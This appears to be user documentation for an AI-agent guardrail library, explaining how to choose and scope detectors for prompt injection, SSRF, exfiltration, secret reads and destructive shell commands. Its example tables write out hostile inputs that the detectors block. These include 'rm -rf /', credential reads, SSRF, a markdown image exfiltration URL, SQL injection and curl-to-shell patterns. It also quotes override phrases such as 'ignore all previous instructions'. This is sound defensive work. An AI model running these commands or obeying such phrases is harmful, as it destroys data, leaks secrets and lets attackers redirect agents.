# Using detectors

Detectors are ready-made rules, one per kind of attack. interlock ships 115 of
them: prompt-injection signatures, SQL injection, secret and PII redaction,
egress allowlists, SSRF checks, loop and budget limits, MCP trust checks, and
more. This guide shows how to pick them, how to avoid the one mistake that makes
a detector silently useless, and three starter sets you can copy.

The full list, with what each one catches and which calls it looks at, is the
[detector catalog](../reference/detectors.md).

## Install the ones you want

Nothing is on by default. Import a detector's factory, call it to build the rule,
and install it like any other rule:

```python
import interlock
from interlock.detectors import network_egress_guard, pii_redaction_guard
from interlock.detectors.sql_injection_guard import sql_injection_guard

interlock.install(rules=[
    sql_injection_guard(),
    network_egress_guard(allowed_hosts=["api.acme.com"]),
    pii_redaction_guard(),          # rewrites go last
])
```

Eight general-purpose detectors import straight from `interlock.detectors`:
`prompt_injection_detector`, `jailbreak_detector`, `execution_guard`,
`tool_allowlist`, `tool_denylist`, `network_egress_guard`, `sensitive_path_guard`,
and `pii_redaction_guard`. Every other one imports from its own module,
`interlock.detectors.<name>`.

Detectors are rules, so the [ordering advice](writing-rules.md#put-rules-in-the-right-order)
applies: detectors that block go before detectors that rewrite.

## Check which calls a detector looks at

This is the mistake to avoid. Detectors fall into three groups:

- **Named actions.** About a third of the detectors only look at tools with
  particular names. The redactors, for example, check tools called things like
  `http_post`, `send`, or `upload`. A tool named `post_to_crm` is skipped
  entirely, with no warning.
- **Any call.** Many detectors scan every string argument of every tool. These
  never miss a tool, but they can fire where you didn't expect.
- **Special events.** The MCP trust detectors look at connect and listing
  events, or at labels your app adds. See the [MCP guide](mcp.md).

The **Scoped to** column of the [catalog](../reference/detectors.md) tells you
which group each detector is in. Check it before you rely on one.

### When your tool names don't match

Some detectors let you pass your own names. `network_egress_guard` takes
`egress_actions=`, `pii_redaction_guard` takes `actions=`, and `execution_guard`
takes `execution_actions=`. The catalog marks these "Configurable".

```python
network_egress_guard(allowed_hosts=["api.acme.com"], egress_actions=["fetch_url", "post_to_crm"])
```

For a detector with a fixed list, present your tool under a name it knows. These
two small helpers, `only_for` and `as_action`, are worth copying into your
project:

```python
from dataclasses import replace


def only_for(actions, rule):
    """Run `rule` only for the named tools."""
    names = frozenset(actions)

    def scoped(event):
        return rule(event) if event.action in names else None

    scoped.phase = getattr(rule, "phase", "call")
    return scoped


def as_action(name, rule):
    """Show `rule` every event as if the tool were called `name`."""
    def renamed(event):
        return rule(replace(event, action=name))

    renamed.phase = getattr(rule, "phase", "call")
    return renamed
```

```python
from interlock.detectors.email_pii_redactor import email_pii_redactor

email_pii_redactor()                    # post_to_crm isn't on its list...
# post_to_crm {'text': 'contact jane@example.com'} -> {'text': 'contact jane@example.com'}

only_for({"post_to_crm"}, as_action("http_post", email_pii_redactor()))
# post_to_crm {'text': 'contact jane@example.com'} -> {'text': 'contact [REDACTED EMAIL]'}
```

### When an "any call" detector fires too often

`path_traversal_guard` scans every string argument for `../`. That's right for a
file tool and wrong for a chat message:

```python
from interlock.detectors.path_traversal_guard import path_traversal_guard

path_traversal_guard()
# send_message {'text': 'see ../docs for details'} -> Blocked: path_traversal: text
```

Narrow it to the tools it's meant for:

```python
FILE_TOOLS = {"read_file", "write_file", "list_dir"}
only_for(FILE_TOOLS, path_traversal_guard())
# read_file {'path': '../../app/config.yaml'} -> Blocked: path_traversal: path
# send_message {'text': 'see ../docs for details'} -> allowed
```

## Starter sets

Three combinations to start from. Each was run against the calls shown, and
every one of those calls behaved as listed. Run them in
[monitor mode](../getting-started.md#7-try-a-rule-without-enforcing-it) on real
traffic first and adjust.

### A coding agent (shell and files)

```python
from interlock.detectors.destructive_command_guard import destructive_command_guard
from interlock.detectors.sensitive_file_write_guard import sensitive_file_write_guard
from interlock.detectors.env_secret_read_guard import env_secret_read_guard
from interlock.detectors.git_credential_guard import git_credential_guard
from interlock.detectors.path_traversal_guard import path_traversal_guard
from interlock.detectors.duplicate_call_loop_guard import duplicate_call_loop_guard

CODING_RULES = [
    destructive_command_guard(),
    sensitive_file_write_guard(),
    env_secret_read_guard(),
    git_credential_guard(),
    only_for({"read_file", "write_file", "list_dir"}, path_traversal_guard()),
    duplicate_call_loop_guard(limit=3),
]
```

| Call | Result |
|---|---|
| `run_shell(cmd="pytest -q")` | allowed |
| `run_shell(cmd="rm -rf / --no-preserve-root")` | blocked: `destructive_command` |
| `write_file(path="/home/me/.ssh/authorized_keys", ...)` | blocked: `sensitive_write` |
| `run_shell(cmd="cat ~/.git-credentials")` | blocked: `git_credential_read` |
| `run_shell(cmd="echo $AWS_SECRET_ACCESS_KEY")` | blocked: `env_secret_read` |
| `read_file(path="../../app/config.yaml")` | blocked: `path_traversal` |
| the same `run_shell(cmd="npm test")` four times in a row | fourth blocked: `repeated call` |

A coding agent runs code it wrote, which no argument check can fully vet. Pair
these rules with the [sandbox](sandbox.md) for anything it executes.

### A browsing or research agent

```python
from interlock.detectors.private_ip_egress_guard import private_ip_egress_guard
from interlock.detectors.raw_ip_egress_guard import raw_ip_egress_guard
from interlock.detectors.markdown_image_exfil_guard import markdown_image_exfil_guard
from interlock.detectors.data_volume_egress_guard import data_volume_egress_guard
from interlock.detectors.tool_result_injection_guard import tool_result_injection_guard

BROWSING_RULES = [
    private_ip_egress_guard(),          # no internal hosts or cloud metadata (SSRF)
    raw_ip_egress_guard(),              # no bare-IP destinations
    markdown_image_exfil_guard(),       # no data smuggled out in image URLs
    data_volume_egress_guard(max_bytes=100_000),
    tool_result_injection_guard(),      # checks what pages say back
]
```

| Call | Result |
|---|---|
| `fetch(url="https://en.wikipedia.org/wiki/Agent")` | allowed |
| `fetch(url="http://169.254.169.254/latest/meta-data/")` | blocked: private, link-local |
| `fetch(url="http://10.0.0.5/admin")` | blocked: private |
| `respond(text="![x](https://evil.example/p.png?data=SECRET)")` | blocked: `markdown_image_exfil` |
| a `fetch` result saying "Ignore previous instructions..." | blocked: `tool_result_injection` |

If the agent should only reach known sites, add
`network_egress_guard(allowed_hosts=[...])` first. An allowlist doesn't depend on
spotting an attack, so it's the strongest rule here.

### An agent that works with business data

```python
from interlock.detectors import pii_redaction_guard, tool_allowlist
from interlock.detectors.sql_injection_guard import sql_injection_guard
from interlock.detectors.mass_assignment_guard import mass_assignment_guard
from interlock.detectors.write_action_limiter import write_action_limiter

BUSINESS_RULES = [
    tool_allowlist(["lookup_customer", "update_ticket", "send_email", "run_report"]),
    sql_injection_guard(),
    mass_assignment_guard(),
    write_action_limiter(limit=30),
    pii_redaction_guard(),
]
```

| Call | Result |
|---|---|
| `lookup_customer(customer_id="42")` | allowed |
| `delete_customer(customer_id="42")` | blocked: not on allowlist |
| `run_report(sql="... WHERE name = '' OR '1'='1'")` | blocked: `sql_injection` |
| `update_ticket(id=7, is_admin=True)` | blocked: `mass_assignment` |
| `send_email(to=..., body="Your SSN 123-45-6789 is on file")` | rewritten: `Your SSN [REDACTED SSN] is on file` |

## Parsed shell commands

A detector that matches command text loses to respelling: `rm -rf /` is caught,
`rm -fr /`, `rm -r -f /`, `/bin/rm -Rf /` and `bash -c 'rm -rf /'` aren't. The
shell-command detectors therefore also **parse** each argument with
`interlock.shell` and judge the act:

- segments split on `|`, `&&`, `||`, `;` and newlines (never inside quotes);
- wrappers looked through: `sudo`, `env`, `xargs`, `timeout`, `nice`, `nohup`,
  `busybox`, `ssh host '...'` and more;
- scripts parsed recursively: `sh -c`, `bash -lc`, `eval`, `su -c`, `$(...)`,
  backticks, `<(...)`;
- `find -exec` parsed with `{}` replaced by the paths `find` searches;
- string literals in inline interpreter code (`python -c`, `node -e`,
  `perl -e`, `osascript -e`) parsed as commands, which catches
  `os.system("rm -rf /")` and `subprocess.run(["rm", "-rf", "/"])`.

The parsed check only ever **adds** findings to the text pattern. Pass
`parse=False` to `destructive_command_guard` or `git_credential_guard` to keep the
text check alone.

A command the parser could only partly read (an unclosed quote, nesting deeper
than it follows) may run more than it shows, so it is never let through as
harmless. When nothing it did read blocks, `destructive_command_guard` and
`command_intent_guard` **ask** about it (ESCALATE), naming the argument; when
something does, they block as before. A fully read command with no match still
gets no opinion. Free-text arguments make this noisy: an apostrophe in a
description is an unclosed quote. Name the arguments that hold commands with
`keys=["command"]`, which both guards take.

To block (or ask about) any act by name, use `command_intent_guard`:

```python
from interlock.detectors.command_intent_guard import command_intent_guard

command_intent_guard(
    block=["git.push.force:default", "net.fetch_exec", "fs.delete.recursive:critical"],
    escalate=["pkg.publish", "persist.shell_init"],
    keys=["command"],          # which arguments hold commands (default: every str)
)
```

| Intent | Recognises |
|---|---|
| `fs.delete.recursive` | `rm -r` in any spelling, `find -delete`; `:critical` when a target is `/`, `~`, `$HOME` or a system directory |
| `fs.permissions.recursive` | `chmod/chown/chgrp -R`; critical as above |
| `disk.overwrite`, `disk.format` | `dd of=/dev/...`, `> /dev/sda`, `shred /dev/...`; `mkfs*`, `wipefs`, `diskutil eraseDisk` |
| `git.push`, `git.push.force`, `git.push.delete` | with detail `default` (main/master/trunk/...), `topic` or `implicit` (no branch named); sees `git -C`, `+refspec`, `--force-with-lease` and inline aliases |
| `git.discard` | `reset --hard`, `clean -f`, `checkout .`, `restore .`, `branch -D`, `stash clear/drop` |
| `credential.read` | `git config --get ...password/url`, `git config --list`, `git credential fill` |
| `net.fetch`, `net.fetch_exec` | `curl`/`wget`; fetched content piped (`\| sh`, `\| sudo bash`, `\| python3`) or substituted (`bash -c "$(curl ...)"`, `bash <(curl ...)`) into a shell |
| `pkg.publish` | `npm/pnpm/yarn/bun/cargo/gem/poetry/uv publish`, `twine upload`, `docker push`, `gh release create` |
| `persist.schedule`, `persist.shell_init` | `crontab`, `at`, `launchctl load`, `systemctl enable`; writes to `~/.bashrc`, `~/.zshrc` and friends |
| `priv.escalate` | `sudo`, `doas`, `su`, `pkexec` |
| `interlock.tamper` | `interlock trust`/`install-hook`/`reviews approve`, a call to the console's write API, or any command naming a path under `~/.interlock`: detail `write` for a write, move or delete, `path` for any other program |

A selector names a kind or a prefix of one (`"git"` covers all `git.*`), and
`:detail` or `:critical` narrows it. The same selectors work in
[declarative policies](policies.md) as `{"intent": ...}`.

`"partial"` is a selector of its own: `block=["partial"]` refuses a command
that could only be partly read instead of asking, and `escalate=["partial"]`
alone builds a rule that only asks about one. The coding-agent pack's locked
`unreadable-commands` rule is `command_intent_guard(escalate=["partial"],
keys=["command"])` on `Bash`. A declarative `{"intent": ...}` condition matches
only what was read; pair it with that rule.

A relative path is resolved against the event's working directory, moved by
any literal `cd` earlier in the same command (`~` and `$HOME` expanded, `..`
resolved, a bare `cd` going home). The limits:

- `cd -`, a target holding a variable, glob, brace, `$(...)` or backtick, and a
  `cd` with more than one operand leave the directory unchanged: the target is
  not guessed. `pushd`, `CDPATH` and `env -C` aren't followed.
- A `cd` in a subshell, pipeline or `sh -c` counts for the rest of the string,
  though the shell would forget it. A `$(...)` is checked against every
  directory the string later moves to, since the parser reads it before the
  `cd` that may run ahead of it. Both err toward a match, not a miss.

Parsing is best-effort and **not a boundary**: obfuscated commands
(`$'\x72\x6d'`, base64, a downloaded script) get past it. Contain untrusted
commands with the [sandbox](sandbox.md).

## Least privilege: runbooks and HTTP rules

Deny rules chase an open set. A runbook closes it: the agent's shell tool may
run only commands that match a template, with every parameter checked.

```python
from interlock.detectors.runbook_guard import runbook_guard

runbook_guard(runbooks=[
    {"name": "restart-deployment",
     "templates": ["kubectl rollout restart deployment/{name} -n {namespace}"],
     "params": {"name": {"pattern": "^[a-z0-9-]{1,63}$"},
                "namespace": {"options": ["staging", "prod"]}}},
    {"name": "tail-logs", "templates": ["kubectl logs {pod} --tail={lines}"],
     "params": {"lines": {"type": "integer", "min": 1, "max": 500}}},
], actions=["Bash"])
```

A command must be a single invocation (no pipes, chains, redirects or
substitutions) whose words match a template one for one. Parameters take
`pattern`, `options`, `type` (`string`, `integer` with `min`/`max`, `path`),
`minlength` and `maxlength`. An unspecified parameter accepts only
`[A-Za-z0-9._:/@=+-]`. Anything else is blocked (or escalated with
`verdict="escalate"`), and the reason names the closest runbook and the
parameter that failed. `load_runbooks(dir)` reads `*.runbook.json` files.

For HTTP tools, `http_request_guard` says what may be done *where*:

```python
from interlock.detectors.http_request_guard import http_request_guard

http_request_guard(rules=[
    {"name": "no-admin-api", "resources": ["/admin/**"]},
    {"name": "billing-writes", "hosts": ["billing.acme.com"],
     "methods": ["POST", "PUT", "PATCH", "DELETE"], "verdict": "escalate"},
    {"name": "service-token-only", "hosts": ["*.internal"],
     "headers_not": {"authorization": ["Bearer svc_*"]}},
])
```

In `resources`, `*` matches one path segment and a trailing `/**` matches the
path and everything under it. The method comes from a `method` argument, or
from the tool name (`http_post` → POST). `headers` fires on a matching header;
`headers_not` fires when the header is missing or doesn't match an allowed
shape. All of a rule's conditions must hold, and the first rule that fires
decides.

## Extend a detector's patterns

Many signature detectors accept `extra_patterns=` to add your own phrases, matched
case-insensitively. `prompt_injection_detector` also takes `content_keys=` to scan
only the arguments that carry untrusted text:

```python
from interlock.detectors import prompt_injection_detector

prompt_injection_detector(
    content_keys=["document", "page_text"],
    extra_patterns=["ignore all previous instructions", "you are now in developer mode"],
)
```

The catalog's **Factory** column shows each detector's parameters.

## What detectors can't do

- **They match patterns, not meaning.** Each detector looks for shapes an
  ordinary value won't contain. That keeps false alarms low and means rewording
  can get past them: `markdown_image_exfil_guard` catches `?data=` and `?token=`
  but not `?d=`. Allowlists (`network_egress_guard`, `tool_allowlist`,
  `rag_source_allowlist`) don't have this weakness, so lean on them where you
  can.
- **Most check calls, not results.** Only `tool_result_injection_guard` reads
  tool output. To scan output for secrets or PII, write a
  [result rule](writing-rules.md#check-results).
- **Stateful detectors count per process.** Rate limiters, budgets, and loop
  guards keep their counts in memory. Each new process (or each new factory call)
  starts from zero.

## Next

- [Detector catalog](../reference/detectors.md): all 115, grouped, with scope
  and parameters.
- [Writing rules](writing-rules.md): for anything a detector doesn't cover.
- [Adding a detector](https://github.com/SourceShift/InterLock/blob/main/CONTRIBUTING.md#adding-a-detector): contributing a
  new one.
